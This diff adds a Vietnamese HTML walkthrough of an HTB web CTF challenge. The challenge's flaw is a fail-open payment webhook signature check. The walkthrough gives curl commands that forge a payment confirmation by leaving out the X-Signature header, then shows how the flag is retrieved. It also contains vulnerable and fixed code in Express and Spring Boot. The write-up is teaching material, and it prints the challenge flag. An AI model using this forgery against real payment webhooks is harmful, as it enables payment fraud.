@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Checkout (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.15rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid(--var--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>🧾 Checkout — Giả mạo webhook thanh toán nhờ lỗi "fail-open"</h1>
+  <div class="sub">Challenge Web (easy) · Event HTB 3692 — Intermediate · <span class="muted">target: <code>http://&lt;host&gt;:&lt;port&gt;</code> (Express, source code được cung cấp kèm đề)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit ở portal):<br>
+    <code>HTB{W3bh00k_S1gn4tur3s_Ar3_Cr1t1c4l}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java Spring Boot, chưa chuyên sâu bảo mật. App mục tiêu viết bằng Node.js/Express, nhưng mọi khái niệm đều có hộp "tương đồng Spring Boot" để bạn bám theo quen thuộc.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — Webhook là gì?</h3>
+<div class="card">
+<p>Webhook là <b>callback HTTP do server của bên thứ ba gọi ngược lại app của mình</b> để báo một sự kiện đã xảy ra. Ví dụ cổ điển: app bạn dùng cổng Stripe; khi khách trả tiền xong, Stripe chủ động POST một request về <code>https://app-cua-ban.com/webhooks/payment</code> để báo "đã thu tiền". App bạn nghe webhook đó rồi mở khoá tài khoản khách.</p>
+<p>Điểm nguy hiểm: <b>bất kỳ ai cũng có thể POST tới endpoint đó</b>. Nếu không kiểm tra ngường gọi có thật sự là Stripe không, kẻ tấn công tự POST một cái "đã thu tiền" giả là xong.</p>
+<div class="spring">
+  <div class="hd">☕ Tương đồng Spring Boot</div>
+  <div class="bd"><p>Giống hệt một <code>@RestController</code> với <code>@PostMapping("/webhooks/payment")</code> mà bạn mở ra công internet. Vấn đề bảo mật nằm ở chỗ: controller này <b>không yêu cầu đăng nhập</b> (vì Stripe không có account trong hệ thống bạn), nên phải xác thực bằng cách khác — thường là chữ ký HMAC.</p></div>
+</div>
+</div>
+
+<h3>0.2 — Xác thực webhook bằng HMAC signature</h3>
+<div class="card">
+<p>Cách chuẩn: hai bên chia sẻ một <b>secret</b> (chuỗi bí mật). Bên gửi (Stripe) tính <code>HMAC-SHA256(secret, rawBody)</code> và gửi kèm trong header, ví dụ <code>X-Signature: &lt;hex&gt;</code>. Bên nhận tự tính lại và so khớp. Kẻ tấn công không biết secret thì không tạo được chữ ký hợp lệ.</p>
+<p>Hai chi tiết quan trọng cho bài này:</p>
+<ul class="dash">
+  <li><b>Phải ký trên raw body</b> (chuỗi byte nguyên vẹn của request), không phải object đã parse — vì parse JSON có thể thay đổi thứ tự key, khiến chuỗi ký lại khác đi. Trong Express, middleware <code>express.json()</code> có option <code>verify</code> cho phép chộp raw body trước khi parse.</li>
+  <li><b>So khớp phải đúng cách.</b> So sánh chuỗi thường bằng <code>===</code> lộ thời gian phản hồi qua kênh kề (timing attack), nên dùng hàm so khớp không rò rỉ thời gian như <code>crypto.timingSafeEqual</code>. App mục tiêu làm đúng chỗ này — <b>lỗi nằm ở chỗ khác</b>.</li>
+</ul>
+<div class="spring">
+  <div class="hd">☕ Tương đồng Spring Boot</div>
+  <div class="bd"><p>Tương đương viết một <code>Filter</code> trước controller đọc <code>request.getInputStream()</code> (raw body), rồi <code>HmacUtils.hmacSha256Hex(secret, body)</code> và so với header <code>X-Signature</code>.</p></div>
+</div>
+<div class="verify"><b>✔ Cách verify:</b> đây là khái niệm, không có lệnh. Ghi nhớ: chữ ký HMAC chỉ an toàn khi <i>luôn luôn</i> được bắt buộc — câu này sẽ là chìa khoá của Phần 3.</div>
+</div>
+
+<h3>0.3 — "Fail-open" vs "fail-closed"</h3>
+<div class="card">
+<p>Hai kiểu xử lý khi kiểm tra bảo mật <b>thất bại hoặc không chạy được</b>:</p>
+<ul class="dash">
+  <li><b>Fail-closed (đúng):</b> nghi ngờ → từ chối. Không có chữ ký → 401. Chữ ký sai → 401.</li>
+  <li><b>Fail-open (sai):</b> "à, không có chữ ký thì chắc bên gửi không dùng chế độ bảo mật, cứ cho qua". Đây chính xác là lỗi của bài này.</li>
+</ul>
+<div class="spring">
+  <div class="hd">☕ Tương đồng Spring Boot</div>
+  <div class="bd"><p>Như viết <code>if (signature != null) { kiểmTra(); }</code> trong filter rồi để request đi tiếp khi <code>signature == null</code> — thay vì <code>if (signature == null || !hợpLệ) { trả 401; return; }</code>.</p></div>
+</div>
+</div>
+
+<h3>0.4 — Các cờ curl dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>-s</code></td><td>im lặng, bỏ tiến trình tải</td><td>output chỉ còn body/headers, dễ đọc và dễ grep</td></tr>
+  <tr><td><code>-i</code></td><td>in kèm response headers</td><td>cần thấy status line (200/404/401) và header <code>X-Powered-By</code> để nhận diện công nghệ server</td></tr>
+  <tr><td><code>-X POST</code></td><td>ép phương thức POST</td><td>webhook và form đăng ký/đăng nhập đều là POST</td></tr>
+  <tr><td><code>-H</code></td><td>gửi kèm header</td><td>đặt <code>Content-Type: application/json</code> cho body JSON, hoặc header <code>X-Signature</code> khi thử nghiệm chữ ký</td></tr>
+  <tr><td><code>-d</code></td><td>gửi body</td><td>payload JSON của webhook, hoặc dữ liệu form <code>name=value&amp;...</code></td></tr>
+  <tr><td><code>-c / -b</code></td><td>lưu / gửi cookie</td><td>đăng nhập xong server set session cookie, bước sau phải gửi lại cookie đó</td></tr>
+  <tr><td><code>--data-raw</code></td><td>gửi body nguyên văn không xử lý</td><td>dùng khi body chứa ký tự đặc biệt cần giữ nguyên</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: vẽ bản đồ luồng thanh toán</h2>
+<p class="muted">Triết lý: khai thác webhook mà không biết app kỳ vọng payload gì thì chỉ là bắn mò. Ta thu thập đủ: luồng nghiệp vụ, các ID hệ thống sinh ra, và (rất may) toàn bộ source code.</p>
+
+<h3>1.1 — Mở trang chủ, nhận diện stack</h3>
+<pre><span class="cm"># xem headers + body trang chủ</span>
+curl -s -i http://&lt;host&gt;:&lt;port&gt;/ | head -20</pre>
+<p>Phản hồi tiêu biểu:</p>
+<pre>HTTP/1.1 200 OK
+X-Powered-By: Express          <span class="cm"># server là Node.js + Express</span>
+Content-Type: text/html; charset=utf-8</pre>
+<p>Trang chủ là cổng "GOV.NOR Vendor Portal" với 3 đường link: <code>/vendor/register</code>, <code>/vendor/sign-in</code>, <code>/vendor/payment/status</code>. Thông điệp chính: vendor phải <b>trả phí đăng ký 149 EUR</b> thì tài khoản mới được kích hoạt, nhưng nút thanh toán bị disable vì "Payment service maintenance" — tức kênh trả tiền hợp lệ đã bị khoá, phải tìm đường khác xác nhận thanh toán.</p>
+<div class="verify"><b>✔ Cách verify:</b> status 200, header <code>X-Powered-By: Express</code>, trong HTML có chuỗi <code>Pay registration fee (149 EUR)</code> và nút disabled.</div>
+
+<h3>1.2 — Đăng ký vendor, thu thập ID hệ thống</h3>
+<pre><span class="cm"># đăng ký tài khoản vendor mới, lưu cookie vào file cj.txt</span>
+curl -s -c cj.txt -X POST http://&lt;host&gt;:&lt;port&gt;/vendor/register \
+  -H <span class="st">'Content-Type: application/x-www-form-urlencoded'</span> \
+  -d <span class="st">'name=Acme&amp;email=acme123@test.com&amp;password=password123'</span></pre>
+<p>Trang trả về "Vendor account" với bảng summary chứa 2 ID rất quan trọng:</p>
+<pre>Vendor ID   : ven_20c7f561fffa
+Account     : PENDING_ACTIVATION
+Payment ID  : pay_031cab9a1594</pre>
+<div class="note"><b>Lưu ý:</b> mỗi lần đăng ký, server sinh ID ngẫu nhiên <b>khác nhau</b> (phần sau <code>ven_</code>/<code>pay_</code> là 12 ký tự hex ngẫu nhiên). Các lệnh tiếp theo của bạn phải dùng ID do phiên của bạn sinh ra, không dùng số trong bài viết này.</div>
+<div class="verify"><b>✔ Cách verify:</b> response 200, trong HTML xuất hiện <code>PENDING_ACTIVATION</code> và một <code>pay_...</code> — ghi lại payment ID này, bước 1.3 dùng ngay.</div>
+
+<h3>1.3 — Kiểm tra trạng thái payment</h3>
+<pre><span class="cm"># xem trạng thái payment của mình</span>
+curl -s <span class="st">"http://&lt;host&gt;:&lt;port&gt;/vendor/payment/status?paymentId=pay_031cab9a1594"</span></pre>
+<p>Kết quả: <code>Status: PENDING</code>, kèm câu "Vendor account remains locked". Đây là mục tiêu cần đổi thành PAID.</p>
+<div class="verify"><b>✔ Cách verify:</b> HTML có chuỗi <code>PENDING</code> và <b>không</b> có chữ <code>Flag</code>. (So sánh chéo với Phần 4: lúc đó cùng một URL sẽ có thêm khối flag.)</div>
+
+<h3>1.4 — Tải source code kèm đề</h3>
+<p>Challenge này có file đính kèm (nút download trên portal HTB). Giải nén được cây thư mục <code>Checkout/</code> với <code>app.js</code>, <code>controllers/webhook.js</code>, <code>controllers/payment.js</code>, <code>models.js</code>, <code>config.js</code>. <b>Đây là tài liệu quan trọng nhất của bài</b> — ta không phải đoán endpoint nữa, đọc code là thấy hết.</p>
+<p>Hai phát hiện ngay từ <code>app.js</code>:</p>
+<pre><span class="cm"># route duy nhất kiểu webhook</span>
+app.post(<span class="st">"/webhooks/payment/confirm"</span>, webhookConfirm);   <span class="cm"># endpoint thật</span>
+
+<span class="cm"># express.json được cấu hình chộp raw body — tác giả TÍNH TOÁN kỹ việc verify chữ ký</span>
+app.use(express.json({
+  verify: (req, res, buf) =&gt; { req.rawBody = buf; }
+}));</pre>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh — ghi nhớ endpoint <code>/webhooks/payment/confirm</code> (khác hẳn các đường mòn ta sẽ đoán ở Phần 2) và việc app có <code>rawBody</code> để verify HMAC. Câu hỏi để lại: vậy tại sao vẫn bị khai thác? Trả lời ở Phần 3.</div>
+
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Ghi lại để bạn khỏi mất thời gian đi lại các đường cùng — và để thấy vì sao phải đọc kỹ source thay vì chỉ fuzz mò.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> Đoán vị trí endpoint webhook bằng fuzz từ điển</h3>
+<p>Trước khi có source, ta thử đoán các path thông dụng:</p>
+<pre><span class="cm"># thử các đường mòn phổ biến — tất cả đều 404</span>
+<span class="kw">for</span> p in webhook webhooks/payment/notify vendor/payment/webhook api/payments internal/webhook; <span class="kw">do</span>
+  curl -s -o /dev/null -w <span class="st">"$p -&gt; %{http_code}\n"</span> -X POST http://&lt;host&gt;:&lt;port&gt;/<span class="st">$p</span> \
+    -H <span class="st">'Content-Type: application/json'</span> -d <span class="st">'{}'</span>
+<span class="kw">done</span></pre>
+<p><b>Kết quả thật:</b> toàn bộ trả <code>404</code> — kể cả <code>/webhooks/payment/confirm</code> cũng 404 với body <code>{}</code> (vì thiếu trường bắt buộc nó trả 400/404 khác, ta lúc đó chưa biết để phân biệt).</p>
+<p><b>Kết luận:</b> fuzz mò không đủ; cần đọc <code>app.js</code> trong source để lấy route chính xác. Sau khi có route thật, thử tiếp ở Phần 2.2.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> Gửi webhook có kèm chữ ký giả</h3>
+<pre><span class="cm"># gửi đúng payload nhưng kèm chữ ký bịa</span>
+curl -s -X POST http://&lt;host&gt;:&lt;port&gt;/webhooks/payment/confirm \
+  -H <span class">'Content-Type: application/json'</span> \
+  -H <span class="st">'X-Signature: deadbeef'</span> \
+  -d <span class="st">'{"event":"payment.confirmed","status":"PAID","paymentId":"pay_031cab9a1594","confirmationRef":"X"}'</span></pre>
+<p><b>Kết quả thật:</b> <code>HTTP 400 — invalid signature</code>.</p>
+<p><b>Kết luận:</b> khi chữ ký <i>có tồn tại</i>, app verify rất chặt (HMAC-SHA256 với secret 32 byte ngẫu nhiên sinh lúc khởi động — brute-force hay giả mạo đều bất khả thi). Đường này không đi được. <b>Nhưng chính câu "khi chữ ký có tồn tại" gợi ý lỗi…</b></p>
+
+<h3><span class="tag bad">THẤT BẠI</span> Gửi payload thiếu/sai trường bắt buộc</h3>
+<pre><span class="cm"># các biến thể bị từ chối — dùng để mapping đầy đủ validate của app</span>
+{<span class="st">"event":"payment.failed"</span>, ...}              <span class="cm"># -&gt; 400 invalid event</span>
+{... <span class="st">"status":"FAILED"</span>}                   <span class="cm"># -&gt; 400 invalid status</span>
+{... <span class="st">"paymentId":"pay_nonexistent"</span>}     <span class="cm"># -&gt; 404 payment not found</span>
+{... (bỏ confirmationRef)}                <span class="cm"># -&gt; 400 invalid confirmation reference</span></pre>
+<p><b>Kết quả thật:</b> từng biến thể bị chặn đúng như trên.</p>
+<p><b>Kết luận:</b> validate dữ liệu nghiệp vụ rất kỹ — muốn qua được phải gửi payload hoàn chỉnh với payment ID thật của mình. Điều này thu hẹp phạm vi còn đúng một câu hỏi: <i>nhánh kiểm tra chữ ký</i>.</p>
+
+<h2 id="p3">Phần 3 — Đột phá: đọc nhánh kiểm tra chữ ký trong source</h2>
+
+<h3>3.1 — Trích code kiểm tra chữ ký</h3>
+<p>Mở <code>controllers/webhook.js</code>, hàm then chốt là <code>handlePaymentConfirmation</code>:</p>
+<pre><span class="kw">function</span> <span class="fn">handlePaymentConfirmation</span>(payload, signature, rawBody) {
+  <span class="cm">// ... validate event / status / paymentId / confirmationRef (rất chặt) ...</span>
+
+  <span class="kw">if</span> (signature) {                                    <span class="cm"># &lt;== CHÌA KHOÁ: chỉ verify KHI CÓ chữ ký</span>
+    <span class="kw">if</span> (!<span class="fn">verifySignature</span>(signature, rawBody || Buffer.from(<span class="st">""</span>))) {
+      <span class="kw">return</span> { statusCode: 400, message: <span class="st">"invalid signature"</span> };
+    }
+    <span class="fn">markPaid</span>(payment.paymentId);
+    <span class="kw">return</span> { statusCode: 200, message: <span class="st">"payment processed"</span> };
+  }
+
+  <span class="fn">markPaid</span>(payment.paymentId);                 <span class="cm"># &lt;== KHÔNG có chữ ký: vẫn markPaid, fail-open!</span>
+  <span class="kw">return</span> { statusCode: 200, message: <span class="st">"payment processed"</span> };
+}</pre>
+<p>Và ở controller, header được đọc bằng <code>req.get("X-Signature")</code> — nếu request <b>không gửi header này</b>, <code>signature</code> là <code>undefined</code>, điều kiện <code>if (signature)</code> sai, và code rơi thẳng xuống nhánh <code>markPaid</code> không kiểm tra gì.</p>
+<p>Đây là lỗi <b>fail-open</b> kinh điển: tác giả viết đúng cả việc lấy raw body, đúng cả <code>timingSafeEqual</code>, nhưng quên dòng "bắt buộc phải có chữ ký". Cứa "con tem" (signature) trong đề bài chính là chỗ này: tem có thể <i>giả</i> — hay thậm chí <i>bỏ trống</i>.</p>
+<div class="verify"><b>✔ Cách verify:</b> phân tích tĩnh — đối chiếu Phần 2.2: khi gửi <code>X-Signature: deadbeef</code> (truthy) thì bị 400; khi không gửi header đó thì <code>signature === undefined</code> (falsy). Hai trạng thái này đi vào hai nhánh khác nhau của cùng một hàm — dự đoán: bỏ header sẽ thành công.</div>
+
+<h3>3.2 — Gửi webhook giả mạo, cố tình KHÔNG kèm chữ ký</h3>
+<p>Payload cần đủ 4 điều kiện đã mapping ở Phần 2.3: event đúng, status đúng, paymentId thật của bạn (bước 1.2), confirmationRef là chuỗi không rỗng. Chỉ thiếu mỗi header <code>X-Signature</code>.</p>
+<pre><span class="cm"># giả mạo thông báo "thanh toán thành công" — chú ý: KHÔNG có header X-Signature</span>
+curl -s -i -X POST http://&lt;host&gt;:&lt;port&gt;/webhooks/payment/confirm \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"event":"payment.confirmed","status":"PAID","paymentId":"pay_031cab9a1594","confirmationRef":"FORGED-1"}'</span></pre>
+<p>Phản hồi:</p>
+<pre>HTTP/1.1 200 OK
+
+payment processed</pre>
+<div class="verify"><b>✔ Cách verify:</b> status <b>200</b> + body <code>payment processed</code> — khác hẳn 400 <code>invalid signature</code> của Phần 2.2 ở đúng một biến số (có/không header chữ ký). So sánh chéo hai lần gửi này chính là bằng chứng lỗi fail-open. Lần này server đã gọi <code>markPaid</code> — nhưng cần kiểm chứng bằng trạng thái thật ở Phần 4.</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: nhận flag ở trang payment status</h2>
+
+<h3>4.1 — Kiểm chứng tài khoản đã ACTIVE</h3>
+<pre><span class="cm"># đăng nhập lại bằng cookie đã lưu ở bước 1.2</span>
+curl -s -b cj.txt -X POST http://&lt;host&gt;:&lt;port&gt;/vendor/sign-in \
+  -H <span class="st">'Content-Type: application/x-www-form-urlencoded'</span> \
+  -d <span class="st">'email=acme123@test.com&amp;password=password123'</span> | grep -E <span class="st">'Account status|ACTIVE'</span></pre>
+<p>Kết quả: <code>&lt;dd&gt;ACTIVE&lt;/dd&gt;</code> — thay cho <code>PENDING_ACTIVATION</code> trước đó, và dòng lỗi "Payment service maintenance" biến mất.</p>
+<div class="verify"><b>✔ Cách verify:</b> so với response bước 1.2 — chỉ có một khác biệt duy nhất là status chuyển <code>PENDING_ACTIVATION</code> → <code>ACTIVE</code>. Đây là kiểm chứng độc lập rằng webhook ở bước 3.2 thật sự đổi trạng thái trong DB của app.</div>
+
+<h3>4.2 — Lấy flag</h3>
+<p>Đọc <code>controllers/payment.js</code> biết: khi payment ở trạng thái PAID, trang status sẽ đọc <code>/flag.txt</code> và in ra. Truy cập lại URL ở bước 1.3:</p>
+<pre>curl -s <span class="st">"http://&lt;host&gt;:&lt;port&gt;/vendor/payment/status?paymentId=pay_031cab9a1594"</span> | grep -A2 Flag</pre>
+<p>Kết quả:</p>
+<pre>&lt;h3&gt;Flag&lt;/h3&gt;&lt;pre&gt;<span class="st">HTB{W3bh00k_S1gn4tur3s_Ar3_Cr1t1c4l}</span>&lt;/pre&gt;</pre>
+<div class="verify"><b>✔ Cách verify:</b> cùng một URL ở bước 1.3 khi đó chỉ có <code>PENDING</code> và không có flag; giờ có thêm khối <code>&lt;h3&gt;Flag&lt;/h3&gt;</code>. Flag khớp định dạng <code>HTB{...}</code>.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Đăng ký vendor, lấy payment ID</td><td>Form <code>/vendor/register</code> công khai trên trang chủ</td><td>Response có <code>PENDING_ACTIVATION</code> + <code>pay_...</code></td></tr>
+  <tr><td>2</td><td>Đọc source, xác định endpoint webhook + lỗi fail-open</td><td>File đính kèm kèm đề: <code>app.js</code>, <code>controllers/webhook.js</code></td><td>Nhánh <code>if (signature)</code> trong <code>handlePaymentConfirmation</code></td></tr>
+  <tr><td>3</td><td>POST <code>/webhooks/payment/confirm</code> không kèm <code>X-Signature</code></td><td>Lỗi fail-open ở bước 2</td><td>200 <code>payment processed</code> (so với 400 khi gửi chữ ký giả)</td></tr>
+  <tr><td>4</td><td>Xác nhận tài khoản ACTIVE</td><td><code>markPaid</code> trong source đổi cả vendor status</td><td>Sign-in lại → <code>ACTIVE</code></td></tr>
+  <tr><td>5</td><td>Mở <code>/vendor/payment/status?paymentId=...</code></td><td><code>payment.js</code>: PAID → đọc <code>/flag.txt</code> in ra</td><td>Khối <code>&lt;h3&gt;Flag&lt;/h3&gt;</code> xuất hiện</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot</h2>
+
+<p>Lỗi không nằm ở thuật toán chữ ký — nó nằm ở <b>điều kiện rẽ nhánh</b>. Tác giả nghĩ "nếu có chữ ký thì kiểm tra", nhưng trong bảo mật đúng phải là "nếu <i>thiếu</i> chữ ký thì từ chối".</p>
+
+<div class="spring bad-ex">
+  <div class="hd">❌ Code bị sai (Express — bản gốc của challenge)</div>
+  <div class="bd"><pre><span class="kw">if</span> (signature) {              <span class="cm">// BUG: verify chỉ chạy khi header tồn tại</span>
+  <span class="kw">if</span> (!verifySignature(signature, rawBody)) {
+    <span class="kw">return</span> res.status(400).send(<span class="st">"invalid signature"</span>);
+  }
+  markPaid(paymentId);        <span class="cm">// đường hợp lệ</span>
+  <span class="kw">return</span> ...
+}
+markPaid(paymentId);          <span class="cm">// &lt;== khách không mang chữ ký vẫn được phục vụ</span></pre></div>
+</div>
+
+<div class="spring">
+  <div class="hd">✅ Code sửa (Express)</div>
+  <div class="bd"><pre><span class="kw">if</span> (<span class="kw">typeof</span> signature !== <span class="st">"string"</span> || !signature) {
+  <span class="kw">return</span> res.status(401).send(<span class="st">"missing signature"</span>);   <span class="cm">// thiếu chữ ký = từ chối ngay</span>
+}
+<span class="kw">if</span> (!verifySignature(signature, req.rawBody)) {
+  <span class="kw">return</span> res.status(401).send(<span class="st">"invalid signature"</span>);  <span class="cm">// sai chữ ký = từ chối</span>
+}
+markPaid(paymentId);</pre></div>
+</div>
+
+<div class="spring bad-ex">
+  <div class="hd">❌ Tương đồng Spring Boot — cách viết tương tự sẽ gặp ở Java</div>
+  <div class="bd"><pre><span class="fn">@PostMapping</span>(<span class="st">"/webhooks/payment/confirm"</span>)
+<span class="kw">public</span> ResponseEntity&lt;String&gt; confirm(<span class="fn">@RequestBody</span> PaymentEvent event,
+                                        <span class="fn">@RequestHeader</span>(value = <span class="st">"X-Signature"</span>, required = <span class="kw">false</span>) String signature,
+                                        HttpServletRequest request) <span class="kw">throws</span> IOException {
+    <span class="kw">if</span> (signature != <span class="kw">null</span>) {              <span class="cm">// BUG y hệt: null header = bỏ qua verify</span>
+        String expected = HmacUtils.hmacSha256Hex(secret, request.getInputStream().readAllBytes());
+        <span class="kw">if</span> (!MessageDigest.isEqual(expected.getBytes(), signature.getBytes())) {
+            <span class="kw">return</span> ResponseEntity.status(401).body(<span class="st">"invalid signature"</span>);
+        }
+    }
+    paymentService.markPaid(event.paymentId());   <span class="cm">// &lt;== vẫn chạy khi signature == null</span>
+    <span class="kw">return</span> ResponseEntity.ok(<span class="st">"payment processed"</span>);
+}</pre></div>
+</div>
+
+<div class="spring">
+  <div class="hd">✅ Cách viết đúng trong Spring Boot</div>
+  <div class="bd"><pre><span class="kw">public</span> ResponseEntity&lt;String&gt; confirm(...,
+                                        <span class="fn">@RequestHeader</span>(<span class="st">"X-Signature"</span>) String signature,  <span class="cm">// required = true mặc định:</span>
+                                        HttpServletRequest request) <span class="kw">throws</span> IOException {          <span class="cm">// thiếu header -&gt; 400 ngay, không vào method</span>
+    byte[] body = request.getInputStream().readAllBytes();   <span class="cm">// đọc raw body TRƯỚC khi @RequestBody parse</span>
+    String expected = HmacUtils.hmacSha256Hex(secret, body);
+    <span class="kw">if</span> (!MessageDigest.isEqual(expected.getBytes(), signature.getBytes())) {
+        <span class="kw">return</span> ResponseEntity.status(401).body(<span class="st">"invalid signature"</span>);
+    }
+    paymentService.markPaid(event.paymentId());
+    <span class="kw">return</span> ResponseEntity.ok(<span class="st">"payment processed"</span>);
+}</pre></div>
+</div>
+
+<div class="tip"><b>Nguyên tắc rút ra:</b> với mọi kiểm tra bảo mật, hãy viết điều kiện theo hướng <b>whitelist</b> — liệt kê trường hợp được phép, mọi thứ còn lại tự động rơi vào từ chối. Đừng viết theo hướng "nếu thấy dấu hiệu xấu thì chặn", vì bạn sẽ luôn quên vài dấu hiệu (như <code>undefined</code>).</div>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>Source code kèm đề là tài liện số một.</b> Một bài easy có thể giải hoàn toàn bằng đọc code — đừng fuzz mò tốn thời gian khi đề đã cho đáp án.</li>
+  <li><b>Map validate trước khi tấn công.</b> Gửi từng biến thể thiếu/sai một trường (Phần 2.3) để biết chính xác app kỳ vọng gì — payload giả mạo sau đó chỉ còn là điền form.</li>
+  <li><b>Hai phản hồi khác nhau ở một biến số = dấu vết lỗi logic.</b> 400 với chữ ký giả vs 200 không chữ ký là manh mối trực tiếp dẫn tới nhánh <code>if (signature)</code>.</li>
+  <li><b>Fail-open thường nằm ở điều kiện rẽ nhánh, không nằm ở thuật toán.</b> App này dùng đúng cả <code>timingSafeEqual</code> lẫn raw body nhưng vẫn thủng vì một dòng <code>if</code>.</li>
+  <li><b>Luôn kiểm chứng side-effect bằng đường độc lập.</b> Webhook trả 200 chưa chắc đã đổi DB — phải đăng nhập lại thấy <code>ACTIVE</code> mới chắc (bước 4.1).</li>
+  <li><b>Checklist tự review code webhook của chính mình:</b> (a) header chữ ký là <b>bắt buộc</b>, không phải optional; (b) verify trên raw body trước khi parse; (c) so khớp bằng hàm constant-time; (d) thiếu/sai chữ ký đều trả 401, không phân biệt để tránh dò; (e) secret không hard-code, không log.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal HTB. Source code đề bài được lưu tại <code>htb_intermediate/checkout/src/Checkout/</code> nếu bạn muốn đối chiếu lại từng dòng. Chúc mừng! 🎉</p>
+
+</div>
+</body>
+</html>
